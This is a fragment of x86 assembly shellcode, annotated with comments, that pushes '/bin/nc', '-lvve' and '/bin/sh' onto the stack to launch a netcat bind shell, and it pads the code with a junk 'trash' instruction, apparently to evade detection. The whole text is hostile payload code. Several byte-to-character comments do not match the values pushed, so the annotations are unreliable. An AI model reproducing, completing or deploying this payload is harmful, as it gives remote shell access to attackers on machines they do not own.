...
_start:
	...
	push 0x68732f		; 0x00 ASCII NUL (end of string); 0x68 ASCII 'h'; 0x73 ASCII 's'; 0x2f ASCII '/'
	push 0x6e69622f		; 0x68 ASCII 'n'; 0x69 ASCII 'i'; 0x62 ASCII 'b'; 0x2f ASCII '/'
	push 0x656c762d		; 0x65 ASCII 'e'; 0x6c ASCII 'l'; 0x76 ASCII 'v'; 0x2d ASCII '-'
	lea ecx, [esp]		; (ECX) -> argv[1] '-lvve/bin/sh'

	stc			; trash

	push 0x636e2f		; 0x00 ASCII NUL (end of string); 0x63 ASCII 'c'; 0x6e ASCII 'n'; 0x2f ASCII '/'
	push dword[esp+0x8]	; 0x68 ASCII 'n'; 0x69 ASCII 'i'; 0x62 ASCII 'b'; 0x2f ASCII '/'
